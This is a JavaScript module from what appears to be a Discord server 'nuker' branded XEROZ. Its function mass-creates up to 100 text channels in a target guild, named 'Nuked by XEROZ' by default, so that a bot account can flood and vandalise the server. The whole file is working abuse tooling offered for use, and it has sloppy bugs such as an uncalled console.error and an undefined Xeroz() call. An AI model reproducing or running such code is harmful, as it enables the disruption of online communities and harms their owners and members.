const consoleColour = require('gradient-string');
const {ChannelType} = require('discord.js');
const { sleep } = require('./CheckGuild');
const { checkGuild } = require("./CheckGuild")

async function createChannel(guildId, name, amount, xeroz)
{
    process.title = `${xeroz.user.username} | [4: MASS CHANNEL]`;

    try {
      await checkGuild(guildId, xeroz);
    } catch (error) {
      console.error;
      return;
    }

    const guild = xeroz.guilds.cache.get(guildId);

      return new Promise(async (resolve) => {
      if (amount > 100) 
    {
      console.log(consoleColour.mind("[Error] : "), `Max channels is 100, Use a number lower than 100`);
      Xeroz()
    };
      for (let i = 0; i < amount; i++) {
          if (guild.channels.cache.size === 500) 
            {
            break;
            }
          if (!name) 
            {
              await guild.channels.create(`Nuked by XEROZ`, 
              {
                type: ChannelType.GuildText, 
              }).catch((err) => { 
                console.log(consoleColour.mind("[Error] : "), `Found: ${err}`)
              })
            }
          
          channel = await guild.channels.create( 
          {
            name: name,
            type: ChannelType.GuildText, 
          }).then((channel) => console.log(consoleColour.mind("[Created] : "), `${channel.name}`)).catch((err) => { 
            console.log(consoleColour.mind("[Error] : "), `Found: ${err}`);
          })
            await sleep(100);
        }
      resolve();
 });
}

module.exports = {
	MassChannel: createChannel
	};